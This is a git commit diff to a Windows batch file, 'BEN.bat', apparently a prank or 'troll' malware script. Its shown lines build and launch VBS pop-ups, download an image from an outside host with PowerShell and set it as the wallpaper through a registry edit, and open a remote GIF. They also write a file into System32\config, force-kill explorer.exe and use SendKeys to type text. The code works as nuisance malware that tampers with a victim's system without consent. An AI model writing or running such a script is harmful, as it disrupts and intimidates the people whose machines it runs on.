d0db614e903204632153a0f8efc662d062f7975d
RJFJJRRJJRR <142161195+RJFJJRRJJRR@users.noreply.github.com>
2025-11-01 18:23:18 +0700

    Update BEN.bat

--- BEN.bat
+++ BEN.bat
@@ -1,16 +1,12 @@
 @echo off
 echo a=inputbox("Enter BEN.EXE to sure you run") >> troll.vbs
-echo if a="BEN.EXE" then
+echo if a="BEN.EXE" then >> troll.vbs
 start troll.vbs
-timeout 10
 set "url=https://i.postimg.cc/s2G0KT6z/images.jpg"
 set "img=%temp%\web_wallpaper.jpg"
-
 powershell -command "(New-Object Net.WebClient).DownloadFile('%url%', '%img%')"
 reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%img%" /f
 RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
-echo X=MsgBox("I see you,0+16,"BEN.EXE")>>hacked.vbs
-start hacked.vbs
 start https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/6d5b1537-df04-4ffe-aad6-86bf81f0b50a/dfa8lu3-af78e118-5d73-4a56-ae1b-12c841b1138f.gif?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOjdlMGQxODg5ODIyNjQzNzNhNWYwZDQxNWVhMGQyNmUwIiwiaXNzIjoidXJuOmFwcDo3ZTBkMTg4OTgyMjY0MzczYTVmMGQ0MTVlYTBkMjZlMCIsIm9iaiI6W1t7InBhdGgiOiIvZi82ZDViMTUzNy1kZjA0LTRmZmUtYWFkNi04NmJmODFmMGI1MGEvZGZhOGx1My1hZjc4ZTExOC01ZDczLTRhNTYtYWUxYi0xMmM4NDFiMTEzOGYuZ2lmIn1dXSwiYXVkIjpbInVybjpzZXJ2aWNlOmZpbGUuZG93bmxvYWQiXX0.xbF-1FlQb5Yz6QFwgmv7TzNFTK7JKUsxWx8IfUifY70
 echo IDK >> "C:\Windows\System32\config\OSDATA.txt"
 taskkill /f /im explorer.exe
@@ -44,8 +40,8 @@ start hacked.vbs
     echo     ch = Mid(text, i, 1)
     echo     WshShell.SendKeys ch
     echo     WScript.Sleep speed
-    echo Next
-)
+    echo Next )
+
 wscript type_writer.vbs
 timeout /t 2 >nul
 del type_writer.vbs
